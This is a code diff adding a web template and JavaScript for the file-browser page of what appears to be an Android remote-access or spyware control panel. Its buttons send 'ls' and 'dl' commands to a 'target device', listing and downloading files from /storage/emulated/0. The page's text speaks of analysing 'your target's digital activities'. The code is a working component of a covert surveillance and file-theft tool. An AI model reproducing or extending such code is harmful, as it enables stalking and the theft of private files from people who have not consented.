@@ -1,0 +1,136 @@
+
+<div class="recent-sales box">
+    <div class="title">Files</div><button style=" position: absolute; padding: 7px; background-color: rgb(0, 128, 90); color: white; border-radius: 5px; border-style: none;" onclick="openDirectory(this, '/storage/emulated/0')">Request Files</button> <br> <br>
+    <div class="sales-details">
+
+        
+
+        <ul class="details">
+            <li class="topic">Name</li>
+
+                <% pageData.forEach((item) => { 
+                %>
+
+                   <li style="padding: 5px;"><%= item.name %></li>
+
+                <% }) %>
+
+        </ul>
+
+        <ul class="details">
+            <br>
+            <li class="topic">-</li>
+
+                <% pageData.forEach((item) => { 
+                %>
+
+                   <li>                    <% if(!item.isDir) { %>
+                    <button class="dlop" style="padding: 7px; background-color: rgb(0, 128, 90); color: white; border-radius: 5px; border-style: none;" onclick="downloadFile(this, '<%= item.path %>')"><i
+                            class="icon download green"></i> Download ↓</button>
+                    <% } else { %>
+                    <button class="dlop" style="padding: 7px; background-color: rgb(0, 119, 128); color: white; border-radius: 5px; border-style: none;"
+                        onclick="openDirectory(this, '<%= item.path %>')"><i
+                            class="icon folder open black"></i> Open +</button>
+                    <% } %></li>
+
+                <% }) %>
+
+        </ul>
+
+    </div>
+
+
+
+    <button style="background: rgb(11, 0, 107); color: white; border-style: none; padding: 7px;" onclick="updateButton(this, '0xFI')">Update</button>
+
+
+
+    </div>
+
+
+    <div class="top-sales box">
+      <div class="title">About</div>
+      <ul class="top-sales-details">
+        <li>
+        <a href="#">
+          <!--<img src="images/sunglasses.jpg" alt="">-->
+          <span class="product">
+This feature enables you to see a list of all apps installed on your target device. So you must know which applications your target is using. Using this feature you can analyze your target’s digital activities.</span>
+        </a>
+      </li>
+      </ul>
+
+      <div class="button">
+        <a href="#">Learn More</a>
+      </div>
+
+    </div>
+
+    
+
+</div>
+
+
+
+
+
+
+<script>
+
+function openDirectory(element, path) {
+    $(element).children().css("opacity", "0");
+    $(element).addClass('blue');
+    $(element).addClass('loading');
+    $('.dlop').addClass('disabled');
+    sendCommand('0xFI', {
+        'action': 'ls',
+        'path' : path,
+    }, (error, message) => {
+        if (error) {
+            setTimeout(() => {
+                showNotification('#f03434', error)
+                $(element).children().css("opacity", "1");
+                $(element).removeClass('blue');
+                $('.dlop').removeClass('loading')
+            }, 300)
+        } else {
+            if (message === 'Requested') {
+                showNotification('#2ecc71', 'Requesting Files, Please Wait');
+                setTimeout(() => {
+                    location.reload();
+                }, 500)
+            }
+        }
+    })
+}
+
+function downloadFile(element, path) {
+    $(element).children().css("opacity", "0");
+    $(element).addClass('green');
+    $(element).addClass('loading');
+    $('.dlop').addClass('disabled');
+    sendCommand('0xFI', {
+        'action': 'dl',
+        'path' : path,
+    }, (error, message) => {
+        if (error) {
+            setTimeout(() => {
+                showNotification('#f03434', error)
+                $(element).children().css("opacity", "1");
+                $(element).removeClass('green');
+                $('.dlop').removeClass('disabled')
+            }, 300)
+        } else {
+            if (message === 'Requested') {
+                setTimeout(() => {
+                    $(element).children().css("opacity", "1");
+                    $(element).removeClass('green');
+                    $(element).removeClass('loading');
+                    $('.dlop').removeClass('disabled')
+                    showNotification('#2ecc71', 'Downloading File, It will be avaliable in `Downloads` Soon');
+                }, 300)
+            }
+        }
+    })
+}
+</script>
